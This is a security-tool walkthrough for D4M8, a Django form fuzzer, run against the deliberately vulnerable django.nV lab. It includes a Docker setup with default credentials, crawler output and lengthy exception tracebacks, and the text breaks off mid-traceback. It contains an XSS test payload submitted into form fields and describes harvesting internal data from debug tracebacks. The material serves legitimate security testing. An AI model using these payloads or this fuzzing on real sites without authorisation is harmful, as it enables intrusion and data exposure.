# Enumeration and Account Takeover via Exception Profiling fuzzing

## Overview
D4M8 (Django web Form Fuzzer for Mapping Exceptions) is an advanced fuzzing tool specifically designed to probe Django web form implementations for unhandled exceptions and security vulnerabilities. It systematically tests form input validation mechanisms, error handling, and submission handlers, capturing complete exception tracebacks with contextual information.
The tool operates either through direct command-line parameters or via rule-based fuzzing configurations. When an exception is triggered, D4M8 captures comprehensive data about it, including stack traces, variable values, and contextual information.

### Key Features

* Web form-focused fuzzing with customizable targets and payloads
* Multi-threading support with fine-grained control over test vectors
* Extraction of sensitive information from exception traces
* Code reassembly from exception traces for deeper analysis
* Mapping of data flows through web form processing components
* Identification of security vulnerabilities through exception patterns

D4M8 works seamlessly with other Vimana framework tools, using both blackbox and informed testing approaches. The collected exceptions allow security researchers and developers to:

* Understand application structure and component relationships
* Trace data flows through form validation and processing
* Discover information disclosure vectors in error handling
* Analyze code patterns for security weaknesses

At its core, D4M8 excels at extracting valuable information from unhandled exceptions in web forms, transforming development errors into comprehensive maps of application behavior and potential security issues. By focusing specifically on web forms, D4M8 targets one of the most common attack surfaces in web applications.

## Use Case

`vimana list --plugins` 
![image](https://github.com/user-attachments/assets/d846a465-7c05-47dd-9449-17b11350c308)
`vimana info --plugin d4m8` 
![image](https://github.com/user-attachments/assets/f5b46282-5207-41c8-9e5a-3ef896441ea2)
`vimana guide --plugin d4m8 --args`
![image](https://github.com/user-attachments/assets/610acd0c-2064-4d9c-a105-ffeb1e90cae4)
`vimana guide --plugin d4m8 --examples`
![image](https://github.com/user-attachments/assets/c5222830-e4f5-4a69-a269-aac20450e28a)

### Lab Setup

Before running D4M8, let's set up a lab environment using django.nV, a purposefully vulnerable Django application provided by nVisium. While you can follow the project's instructions to run it locally on your host machine, I strongly recommend containerizing it for security reasons.
The easiest way to set this up is by copying and pasting the following commands directly into your Linux terminal (after carefully reviewing them, of course):
```yaml
{
echo "üöÄ Configurando django.nV..."

# Dockerfile
cat > Dockerfile << 'DOC'
FROM python:3.8-slim
ENV PYTHONDONTWRITEBYTECODE=1
ENV PYTHONUNBUFFERED=1
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update && apt-get install -y git build-essential sqlite3 curl && rm -rf /var/lib/apt/lists/*
WORKDIR /app
RUN git clone https://github.com/NetSPI/django.nV.git . && echo "‚úÖ Projeto clonado!"
RUN pip install --upgrade pip && pip install -r requirements.txt && echo "‚úÖ Depend√™ncias instaladas!"
RUN chmod +x reset_db.sh runapp.sh && sed -i 's/\r$//' reset_db.sh runapp.sh
RUN ./reset_db.sh && echo "‚úÖ Banco configurado!"
RUN python manage.py shell -c "from django.contrib.auth.models import User; User.objects.create_superuser('admin', 'admin@example.com', 'admin123') if not User.objects.filter(username='admin').exists() else print('Admin exists')" || echo "Admin OK"
RUN python manage.py collectstatic --noinput || echo "Static OK"
RUN python manage.py check && echo "‚úÖ Tudo OK!"
EXPOSE 8000
CMD ["python", "manage.py", "runserver", "0.0.0.0:8000"]
DOC

# docker-compose.yml
cat > docker-compose.yml << 'COMPOSE'
version: '3.8'
services:
  django-nv:
    build: .
    container_name: django-nv-app
    ports:
      - "8000:8000"
    environment:
      - DEBUG=1
    depends_on:
      - mailhog
    restart: unless-stopped
  mailhog:
    image: mailhog/mailhog:latest
    container_name: django-nv-mailhog
    ports:
      - "1025:1025"
      - "8025:8025"
    restart: unless-stopped
COMPOSE

echo "‚úÖ Arquivos criados!"
echo "üîß Iniciando docker-compose..."
docker-compose up --build

} && echo "üéâ Setup conclu√≠do! Acesse http://localhost:8000 (admin/admin123)"
```
#### Available Resources
If everything runs successfully, you'll have the following resources available:
```
üåê URLs:

TaskManager Application: http://localhost:8000
Tutorials: http://localhost:8000/taskManager/tutorials/
MailHog: http://localhost:8025
Login: admin / admin123
```
#### Application Interface
Accessing the application URL http://localhost:8000 will display the main page:
![image](https://github.com/user-attachments/assets/7d96db41-a124-4970-9daa-a77fc09b70ad)


To register a new user, navigate to http://localhost:8000/taskManager/register/. Create several users and note their email addresses for testing purposes.
![image](https://github.com/user-attachments/assets/8bd94456-2fb8-4419-afb5-f57f7cf1e531)

![image](https://github.com/user-attachments/assets/18f84116-a90f-4865-9db7-bdb6ecef2019)

### Running D4M8 Initial Analysis
#### Basic Scan
`vimana run plugin d4m8 --target-url http://localhost:8000`

###### DMT - Scope Enrichment Step
The first phase involves scope enrichment using the DMT (Django Misconfiguration Tracker). This step discovers and maps application endpoints, forms, and potential attack surfaces.
![image](https://github.com/user-attachments/assets/b3a89b53-7c14-4158-8dd2-3c2eb5ce7a20)
![image](https://github.com/user-attachments/assets/71a4491a-103c-43a3-b02d-50a74899380c)
As shown in the output, the plugin identifies various URL paths and begins pattern mapping via NoReverseMatch analysis.


###### ViWeC - Web Crawler step 
The web crawler component systematically explores the discovered endpoints, building a comprehensive map of the application structure. This includes both publicly accessible and authenticated areas of the application.
![image](https://github.com/user-attachments/assets/7b285844-8683-4bec-b154-b8379cb8a8cc)

<details>
<summary>Show full Crawler Output</summary>

```python

      .   .   .
    . ^ . ^ . ^ .     
  _/|\_/|\_/|\_/|\_   
 / \./ \./ \./ \./ \  vimana
(-V-|-1-|-W-|-3-|-C-) web
 \_/.\_/.\_/.\_/.\_/  crawler
   \|/*\|/*\|/*\|/
    .   .   .   .
       
  


    

[2025-06-14 16:37:39.256687] ‚Üí Starting viwec against 1 inital URLs 
„Äê200„Äë‚ä∂  http://localhost:8000
    + http://localhost:8000/
    + http://localhost:8000/taskManager/tutorials/
    + http://localhost:8000/taskManager/register
    + http://localhost:8000/taskManager/login
    + http://localhost:8000/taskManager/register
„Äê200„Äë‚ä∂  http://localhost:8000
    + http://localhost:8000/
    + http://localhost:8000/taskManager/tutorials/
    + http://localhost:8000/taskManager/register
    + http://localhost:8000/taskManager/login
    + http://localhost:8000/taskManager/register
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/tutorials/
    + http://localhost:8000/taskManager/
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/register/
    + http://localhost:8000/
    + http://localhost:8000/taskManager/tutorials/
    + http://localhost:8000/taskManager/register
    + http://localhost:8000/taskManager/login
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/login/
    + http://localhost:8000/
    + http://localhost:8000/taskManager/tutorials/
    + http://localhost:8000/taskManager/register
    + http://localhost:8000/taskManager/login
    + http://localhost:8000/taskManager/tutorials/#myModal
    + http://localhost:8000/taskManager/login/
    + http://localhost:8000/taskManager/forgot_password
    + http://localhost:8000/taskManager/tutorials/injection/
    + http://localhost:8000/taskManager/tutorials/brokenauth/
    + http://localhost:8000/taskManager/tutorials/xss/
    + http://localhost:8000/taskManager/tutorials/idor/
    + http://localhost:8000/taskManager/tutorials/misconfig/
    + http://localhost:8000/taskManager/tutorials/exposure/
    + http://localhost:8000/taskManager/tutorials/access/
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/
    + http://localhost:8000/
    + http://localhost:8000/taskManager/tutorials/
    + http://localhost:8000/taskManager/register
    + http://localhost:8000/taskManager/login
    + http://localhost:8000/taskManager/register
    + http://localhost:8000/taskManager/tutorials/csrf/
    + http://localhost:8000/taskManager/tutorials/components/
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/forgot_password/
    + http://localhost:8000/
    + http://localhost:8000/taskManager/tutorials/
    + http://localhost:8000/taskManager/register
    + http://localhost:8000/taskManager/login
    + http://localhost:8000/taskManager/tutorials/redirects/
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/tutorials/injection/
    + http://localhost:8000/taskManager/
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/tutorials/brokenauth/
    + http://localhost:8000/taskManager/
    + http://localhost:8000/taskManager/tutorials/injection/#myModal
    + http://localhost:8000/taskManager/login/
    + http://localhost:8000/taskManager/tutorials/injection/
    + http://localhost:8000/taskManager/tutorials/brokenauth/
    + http://localhost:8000/taskManager/tutorials/xss/
    + http://localhost:8000/taskManager/tutorials/idor/
    + http://localhost:8000/taskManager/tutorials/misconfig/
    + http://localhost:8000/taskManager/tutorials/exposure/
    + http://localhost:8000/taskManager/tutorials/access/
    + http://localhost:8000/taskManager/tutorials/csrf/
    + http://localhost:8000/taskManager/tutorials/components/
    + http://localhost:8000/taskManager/tutorials/redirects/
    + http://localhost:8000/taskManager/tutorials/brokenauth/#myModal
    + http://localhost:8000/taskManager/login/
    + http://localhost:8000/taskManager/tutorials/injection/
    + http://localhost:8000/taskManager/tutorials/brokenauth/
    + http://localhost:8000/taskManager/tutorials/xss/
    + http://localhost:8000/taskManager/tutorials/idor/
    + http://localhost:8000/taskManager/tutorials/misconfig/
    + http://localhost:8000/taskManager/tutorials/exposure/
    + http://localhost:8000/taskManager/tutorials/access/
    + http://localhost:8000/taskManager/tutorials/csrf/
    + http://localhost:8000/taskManager/tutorials/components/
    + http://localhost:8000/taskManager/tutorials/redirects/
    + http://localhost:8000/taskManager/tutorials/injection/#accordion1_1
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/tutorials/xss/
    + http://localhost:8000/taskManager/
    + http://localhost:8000/taskManager/tutorials/brokenauth/#accordion1_1
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/tutorials/idor/
    + http://localhost:8000/taskManager/
    + http://localhost:8000/taskManager/tutorials/injection/#accordion1_2
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/tutorials/misconfig/
    + http://localhost:8000/taskManager/
    + http://localhost:8000/taskManager/tutorials/xss/#myModal
    + http://localhost:8000/taskManager/login/
    + http://localhost:8000/taskManager/tutorials/injection/
    + http://localhost:8000/taskManager/tutorials/brokenauth/
    + http://localhost:8000/taskManager/tutorials/xss/
    + http://localhost:8000/taskManager/tutorials/idor/
    + http://localhost:8000/taskManager/tutorials/misconfig/
    + http://localhost:8000/taskManager/tutorials/exposure/
    + http://localhost:8000/taskManager/tutorials/access/
    + http://localhost:8000/taskManager/tutorials/csrf/
    + http://localhost:8000/taskManager/tutorials/brokenauth/#accordion1_2
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/tutorials/exposure/
    + http://localhost:8000/taskManager/
    + http://localhost:8000/taskManager/tutorials/idor/#myModal
    + http://localhost:8000/taskManager/login/
    + http://localhost:8000/taskManager/tutorials/injection/
    + http://localhost:8000/taskManager/tutorials/brokenauth/
    + http://localhost:8000/taskManager/tutorials/xss/
    + http://localhost:8000/taskManager/tutorials/idor/
    + http://localhost:8000/taskManager/tutorials/misconfig/
    + http://localhost:8000/taskManager/tutorials/exposure/
    + http://localhost:8000/taskManager/tutorials/access/
    + http://localhost:8000/taskManager/tutorials/csrf/
    + http://localhost:8000/taskManager/tutorials/components/
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/tutorials/access/
    + http://localhost:8000/taskManager/
    + http://localhost:8000/taskManager/tutorials/injection/#accordion1_3
    + http://localhost:8000/taskManager/tutorials/misconfig/#myModal
    + http://localhost:8000/taskManager/login/
    + http://localhost:8000/taskManager/tutorials/injection/
    + http://localhost:8000/taskManager/tutorials/brokenauth/
    + http://localhost:8000/taskManager/tutorials/xss/
    + http://localhost:8000/taskManager/tutorials/idor/
    + http://localhost:8000/taskManager/tutorials/misconfig/
    + http://localhost:8000/taskManager/tutorials/exposure/
    + http://localhost:8000/taskManager/tutorials/access/
    + http://localhost:8000/taskManager/tutorials/csrf/
    + http://localhost:8000/taskManager/tutorials/components/
    + http://localhost:8000/taskManager/tutorials/redirects/
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/tutorials/csrf/
    + http://localhost:8000/taskManager/
    + http://localhost:8000/taskManager/tutorials/components/
    + http://localhost:8000/taskManager/tutorials/redirects/
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/tutorials/components/
    + http://localhost:8000/taskManager/
    + http://localhost:8000/taskManager/tutorials/brokenauth/#accordion1_3
„Äê200„Äë‚ä∂  http://localhost:8000/taskManager/tutorials/redirects/
    + http://localhost:8000/taskManager/
    + http://localhost:8000/taskManager/tutorials/exposure/#myModal
    + http://localhost:8000/taskManager/login/
    + http://localhost:8000/taskManager/tutorials/injection/
    + http://localhost:8000/taskManager/tutorials/brokenauth/
    + http://localhost:8000/taskManager/tutorials/xss/
    + http://localhost:8000/taskManager/tutorials/idor/
    + http://localhost:8000/taskManager/tutorials/misconfig/
    + http://localhost:8000/taskManager/tutorials/exposure/
    + http://localhost:8000/taskManager/tutorials/access/
    + http://localhost:8000/taskManager/tutorials/csrf/
    + http://localhost:8000/taskManager/tutorials/components/
    + http://localhost:8000/taskManager/tutorials/redirects/
    + http://localhost:8000/taskManager/tutorials/redirects/
    + http://localhost:8000/taskManager/tutorials/access/#myModal
    + http://localhost:8000/taskManager/login/
    + http://localhost:8000/taskManager/tutorials/injection/
    + http://localhost:8000/taskManager/tutorials/brokenauth/
    + http://localhost:8000/taskManager/tutorials/xss/
    + http://localhost:8000/taskManager/tutorials/idor/
    + http://localhost:8000/taskManager/tutorials/misconfig/
    + http://localhost:8000/taskManager/tutorials/exposure/
    + http://localhost:8000/taskManager/tutorials/access/
    + http://localhost:8000/taskManager/tutorials/csrf/
    + http://localhost:8000/taskManager/tutorials/injection/#accordion1_4
    + http://localhost:8000/taskManager/tutorials/misconfig/#accordion1_1
    + http://localhost:8000/taskManager/tutorials/csrf/#myModal
    + http://localhost:8000/taskManager/login/
    + http://localhost:8000/taskManager/tutorials/injection/
    + http://localhost:8000/taskManager/tutorials/brokenauth/
    + http://localhost:8000/taskManager/tutorials/xss/
    + http://localhost:8000/taskManager/tutorials/idor/
    + http://localhost:8000/taskManager/tutorials/misconfig/
    + http://localhost:8000/taskManager/tutorials/exposure/
    + http://localhost:8000/taskManager/tutorials/access/
    + http://localhost:8000/taskManager/tutorials/csrf/
    + http://localhost:8000/taskManager/tutorials/xss/#accordion1_1
    + http://localhost:8000/taskManager/tutorials/components/#myModal
    + http://localhost:8000/taskManager/login/
    + http://localhost:8000/taskManager/tutorials/injection/
    + http://localhost:8000/taskManager/tutorials/brokenauth/
    + http://localhost:8000/taskManager/tutorials/xss/
    + http://localhost:8000/taskManager/tutorials/idor/
    + http://localhost:8000/taskManager/tutorials/misconfig/
    + http://localhost:8000/taskManager/tutorials/exposure/
    + http://localhost:8000/taskManager/tutorials/access/
    + http://localhost:8000/taskManager/tutorials/csrf/
    + http://localhost:8000/taskManager/tutorials/brokenauth/#accordion1_4
    + http://localhost:8000/taskManager/tutorials/redirects/#myModal
    + http://localhost:8000/taskManager/login/
    + http://localhost:8000/taskManager/tutorials/injection/
    + http://localhost:8000/taskManager/tutorials/brokenauth/
    + http://localhost:8000/taskManager/tutorials/xss/
    + http://localhost:8000/taskManager/tutorials/idor/
    + http://localhost:8000/taskManager/tutorials/misconfig/
    + http://localhost:8000/taskManager/tutorials/exposure/
    + http://localhost:8000/taskManager/tutorials/access/
    + http://localhost:8000/taskManager/tutorials/csrf/
    + http://localhost:8000/taskManager/tutorials/components/
    + http://localhost:8000/taskManager/tutorials/redirects/
    + http://localhost:8000/taskManager/tutorials/exposure/#accordion1_1
    + http://localhost:8000/taskManager/tutorials/idor/#accordion1_1
    + http://localhost:8000/taskManager/tutorials/components/
    + http://localhost:8000/taskManager/tutorials/redirects/
    + http://localhost:8000/taskManager/tutorials/misconfig/#accordion1_2
    + http://localhost:8000/taskManager/tutorials/components/
    + http://localhost:8000/taskManager/tutorials/redirects/
    + http://localhost:8000/taskManager/tutorials/xss/#accordion1_2
    + http://localhost:8000/taskManager/tutorials/components/
    + http://localhost:8000/taskManager/tutorials/redirects/
    + http://localhost:8000/taskManager/tutorials/redirects/#accordion1_1
    + http://localhost:8000/taskManager/tutorials/exposure/#accordion1_2
    + http://localhost:8000/taskManager/tutorials/idor/#accordion1_2
    + http://localhost:8000/taskManager/tutorials/access/#accordion1_1
    + http://localhost:8000/taskManager/tutorials/misconfig/#accordion1_3
    + http://localhost:8000/taskManager/tutorials/csrf/#accordion1_1
    + http://localhost:8000/taskManager/tutorials/xss/#accordion1_3
    + http://localhost:8000/taskManager/tutorials/components/#accordion1_1
    + http://localhost:8000/taskManager/tutorials/redirects/#accordion1_2
    + http://localhost:8000/taskManager/tutorials/exposure/#accordion1_3
    + http://localhost:8000/taskManager/tutorials/idor/#accordion1_3
    + http://localhost:8000/taskManager/tutorials/access/#accordion1_2
    + http://localhost:8000/taskManager/tutorials/misconfig/#accordion1_4
    + http://localhost:8000/taskManager/tutorials/csrf/#accordion1_2
    + http://localhost:8000/taskManager/tutorials/xss/#accordion1_4
    + http://localhost:8000/taskManager/tutorials/components/#accordion1_2
    + http://localhost:8000/taskManager/tutorials/redirects/#accordion1_3
    + http://localhost:8000/taskManager/tutorials/exposure/#accordion1_4
    + http://localhost:8000/taskManager/tutorials/idor/#accordion1_4
    + http://localhost:8000/taskManager/tutorials/access/#accordion1_3
    + http://localhost:8000/taskManager/tutorials/csrf/#accordion1_3
    + http://localhost:8000/taskManager/tutorials/components/#accordion1_3
    + http://localhost:8000/taskManager/tutorials/redirects/#accordion1_4
    + http://localhost:8000/taskManager/tutorials/access/#accordion1_4
    + http://localhost:8000/taskManager/tutorials/csrf/#accordion1_4
    + http://localhost:8000/taskManager/tutorials/components/#accordion1_4


```
</details>

###### D4M8 Fuzzing 
After enriching the scope, the plugin begins testing with an initial scope of 109 URLs, even though we only provided the target URL. Detailed information about the request and response is displayed as soon as the first exception is triggered.
![image](https://github.com/user-attachments/assets/edf883c5-c3cf-4de3-9468-12c0f8712854)

Here's an example where the plugin attempts to send a form found in the `taskmanager/reset_password/` endpoint with empty values:
```
       Content-Type: application/x-www-form-urlencoded
            Referer: http://localhost:8000/taskManager/reset_password/
             Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en
    Accept-Encoding: gzip, deflate, br, zstd
             Cookie: csrftoken=B1QUduZznOLpQbUr0lqYcbl9V8nwVt3d; sessionid=gAV9lC4:1uQA6G:BXfWWHnkAsalKZaMm3iOfaURJ7M
       csrfmiddlewaretoken: None

        reset_token: ""
       new_password: ""
   confirm_password: ""
```

#### Response Analysis
This triggers a `MultipleObjectsReturned` exception, providing detailed information about the application's internal state and structure.
![image](https://github.com/user-attachments/assets/cafc6d94-d7b5-4839-bf02-a68d6d24c675)

We have all the variables and their respective values in that exception traceback, and at this point, nothing particularly interesting inside this MultipleObjectsReturned dump.

![image](https://github.com/user-attachments/assets/2ebb7b93-379c-489c-903f-c225bc7f5b76)

### Categorizing Exception Severity
Some exceptions are more critical than others, and this distinction is important for creating rules that specify target exceptions. For example, a ValueError is typically less interesting than an IntegrityError:
![image](https://github.com/user-attachments/assets/5f4fdcbd-db3c-46f9-a62c-35d57b2a7f81)

And here is the specific trigger affecting the taskManager module itself, where the ValueError was triggered:
![image](https://github.com/user-attachments/assets/82087dcc-23bc-4833-92d1-acf5b804c065)

This shows the application attempting to convert malicious input to an integer:

As you can see, it's all about this part:
```Python
         Line trigger: 331   int(request.POST.get('project_duedate', False))))
```
which becomes like this with our test payload:
```Python
         Line trigger: 331   int("<samp onfocusout=alert(1) tabindex=1 id=x></samp><input autofocus>")
```
Since this conversion is impossible, it throws a ValueError. Once you understand this pattern, you can skip all ValueError occurrences by running:
```
vimana run d4m8 --target-url http://127.0.0.1:8000 --skip-exceptions ValueError
```

#### IntegrityError Example
In contrast, here's an `IntegrityError` exception dump:
![image](https://github.com/user-attachments/assets/b9b1a0ab-304c-4860-8bf8-de9759c0179d)

<details>
<summary>Show full Traceback</summary>

```python
 ‚Æö              Request                       

       Content-Type: application/x-www-form-urlencoded
            Referer: http://localhost:8000/taskManager/project_create/
             Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en
    Accept-Encoding: gzip, deflate, br, zstd
             Cookie: csrftoken=B1QUduZznOLpQbUr0lqYcbl9V8nwVt3d; sessionid=gAV9lC4:1uQA6G:BXfWWHnkAsalKZaMm3iOfaURJ7M
       csrfmiddlewaretoken: None

                  q: 1-false
csrfmiddlewaretoken: B1QUduZznOLpQbUr0lqYcbl9V8nwVt3d

	   <input type="text" name="q" class="form-control search" placeholder="Search">text">                                   
	   <input type="hidden" name="csrfmiddlewaretoken" value="B1QUduZznOLpQbUr0lqYcbl9V8nwVt3d">
	   <input name="title" class="form-control" placeholder="">
	   <input name="project_duedate" class="form-control" id="datetimepicker" type="text">

 ‚Æò             Response                       

               Date: Fri, 13 Jun 2025 22:25:43 GMT
             Server: WSGIServer/0.2 CPython/3.8.20
       Content-Type: text/html
    X-Frame-Options: SAMEORIGIN
               Vary: Cookie

    IntegrityError 

             Reason: A violation of a Django database relation occurred
           Category: Database Exceptions
     Request Method: POST
        Request URL: http://localhost:8000/taskManager/project_create/
     Django Version: 1.8.3
    Exception Value: ['NOT NULL constraint failed: taskManager_project_users_assigned.user_id']
 Exception Location: /usr/local/lib/python3.8/site-packages/django/db/backends/sqlite3/base.py in execute, line 318
  Python Executable: /usr/local/bin/python
     Python Version: 3.8.20
        Python Path: ['/app\n /usr/local/lib/python38.zip\n /usr/local/lib/python3.8\n /usr/local/lib/python3.8/lib-dynload\n /usr/local/lib/python3.8/site-packages']
        Server time: Fri, 13 Jun 2025 22:25:43 +0000

          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/core/handlers/base.py
             Function: get_response
         Line trigger: 132   response = wrapped_callback(request, *callback_args, **callback_kwargs)

                  ‚óé  vars 

                     self: <django.core.handlers.wsgi.WSGIHandler object at 0x7fa378569ee0>
                  urlconf: 'taskManager.urls'
                 resolver: <RegexURLResolver 'taskManager.urls' (None:None) ^/>
                 response: None
        middleware_method: <bound method CsrfViewMiddleware.process_view of <django.middleware.csrf.CsrfViewMiddleware object at 0x7fa37716dfd0>>
           resolver_match: ResolverMatch(func=taskManager.views.project_create, args=(), kwargs={}, url_name=project_create, app_name=None, namespaces=['taskManager'])
                 callback: <function project_create at 0x7fa3770afee0>
            callback_args: ()
          callback_kwargs: {}
         wrapped_callback: <function project_create at 0x7fa3770afee0>
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/models/fields/related.py
             Function: __set__
         Line trigger: 1274   manager.add(*value)

                  ‚óé  vars 

                     self: <django.db.models.fields.related.ReverseManyRelatedObjectsDescriptor object at 0x7fa377578ee0>
                 instance: Error in formatting: TypeError: __str__ returned non-string (type bool)
                    value: (None,)
                  manager: <django.db.models.fields.related.create_many_related_manager.<locals>.ManyRelatedManager object at 0x7fa3771f36a0>
                       db: 'default'
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/models/fields/related.py
             Function: add
         Line trigger: 984   self._add_items(self.source_field_name, self.target_field_name, *objs)

                  ‚óé  vars 

                     self: <django.db.models.fields.related.create_many_related_manager.<locals>.ManyRelatedManager object at 0x7fa3771f36a0>
                     objs: (None,)
                       db: 'default'
                      rel: <ManyToManyRel: taskManager.project>
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/models/fields/related.py
             Function: _add_items
         Line trigger: 1103   self.through._default_manager.using(db).bulk_create([

                  ‚óé  vars 

                     objs: (None,)
                    Model: <class 'django.db.models.base.Model'>
                  new_ids: {None}
                      obj: None
                       db: 'default'
                     vals: []
                     self: <django.db.models.fields.related.create_many_related_manager.<locals>.ManyRelatedManager object at 0x7fa3771f36a0>
        source_field_name: 'project'
        target_field_name: 'user'
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/models/query.py
             Function: bulk_create
         Line trigger: 392   self._batched_insert(objs_without_pk, fields, batch_size)

                  ‚óé  vars 

                     self: [<Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>]
                     objs: [<Project_users_assigned: Project_users_assigned object>]
               batch_size: None
               connection: <django.db.backends.sqlite3.base.DatabaseWrapper object at 0x7fa37710b490>
                   fields: [<django.db.models.fields.related.ForeignKey: project>, <django.db.models.fields.related.ForeignKey: user>]
             objs_with_pk: []
          objs_without_pk: [<Project_users_assigned: Project_users_assigned object>]
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/models/query.py
             Function: _batched_insert
         Line trigger: 936   self.model._base_manager._insert(batch, fields=fields,

                  ‚óé  vars 

                     self: [<Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>]
                   fields: [<django.db.models.fields.related.ForeignKey: project>, <django.db.models.fields.related.ForeignKey: user>]
                      ops: <django.db.backends.sqlite3.operations.DatabaseOperations object at 0x7fa37710bfd0>
                    batch: [<Project_users_assigned: Project_users_assigned object>]
               batch_size: 499
                     objs: [<Project_users_assigned: Project_users_assigned object>]
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/models/manager.py
             Function: manager_method
         Line trigger: 127   return getattr(self.get_queryset(), name)(*args, **kwargs)

                  ‚óé  vars 

                     self: <django.db.models.manager.Manager object at 0x7fa377578f70>
                     args: ([<Project_users_assigned: Project_users_assigned object>],)
                   kwargs: {'fields': [<django.db.models.fields.related.ForeignKey: project>,            <django.db.models.fields.related.ForeignKey: user>], 'using': 'default'}
                     name: '_insert'
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/models/query.py
             Function: _insert
         Line trigger: 920   return query.get_compiler(using=using).execute_sql(return_id)

                  ‚óé  vars 

                     self: [<Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>, <Project_users_assigned: Project_users_assigned object>]
                     objs: [<Project_users_assigned: Project_users_assigned object>]
                   fields: [<django.db.models.fields.related.ForeignKey: project>, <django.db.models.fields.related.ForeignKey: user>]
                return_id: False
                      raw: False
                    using: 'default'
                    query: <django.db.models.sql.subqueries.InsertQuery object at 0x7fa35ef9ea60>
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/models/sql/compiler.py
             Function: execute_sql
         Line trigger: 974   cursor.execute(sql, params)

                  ‚óé  vars 

                     self: <django.db.models.sql.compiler.SQLInsertCompiler object at 0x7fa35ef9e130>
                return_id: False
                   cursor: <django.db.backends.utils.CursorDebugWrapper object at 0x7fa35ef9ec10>
                      sql: ('INSERT INTO "taskManager_project_users_assigned" ("project_id", "user_id") ' 'SELECT %s AS "project_id", %s AS "user_id"')
                   params: (32, None)
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/backends/utils.py
             Function: execute
         Line trigger: 79   return super(CursorDebugWrapper, self).execute(sql, params)

                  ‚óé  vars 

                     self: <django.db.backends.utils.CursorDebugWrapper object at 0x7fa35ef9ec10>
                      sql: ('QUERY = \'INSERT INTO "taskManager_project_users_assigned" ("project_id", ' '"user_id") SELECT %s AS "project_id", %s AS "user_id"\' - PARAMS = (32, ' 'None)')
                   params: (32, None)
                    start: 1749853543.4822485
                     stop: 1749853543.4823608
                 duration: 0.00011229515075683594
                __class__: <class 'django.db.backends.utils.CursorDebugWrapper'>
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/backends/utils.py
             Function: execute
         Line trigger: 64   return self.cursor.execute(sql, params)

                  ‚óé  vars 

                     self: <django.db.backends.utils.CursorDebugWrapper object at 0x7fa35ef9ec10>
                      sql: ('INSERT INTO "taskManager_project_users_assigned" ("project_id", "user_id") ' 'SELECT %s AS "project_id", %s AS "user_id"')
                   params: (32, None)
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/utils.py
             Function: __exit__
         Line trigger: 97   six.reraise(dj_exc_type, dj_exc_value, traceback)

                  ‚óé  vars 

                     self: <django.db.utils.DatabaseErrorWrapper object at 0x7fa3771f3220>
                 exc_type: <class 'sqlite3.IntegrityError'>
                exc_value: IntegrityError('NOT NULL constraint failed: taskManager_project_users_assigned.user_id')
                traceback: <traceback object at 0x7fa3771daf00>
              dj_exc_type: <class 'django.db.utils.IntegrityError'>
              db_exc_type: <class 'sqlite3.IntegrityError'>
             dj_exc_value: IntegrityError('NOT NULL constraint failed: taskManager_project_users_assigned.user_id')
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/utils/six.py
             Function: reraise
         Line trigger: 658   raise value.with_traceback(tb)

                  ‚óé  vars 

                       tp: <class 'django.db.utils.IntegrityError'>
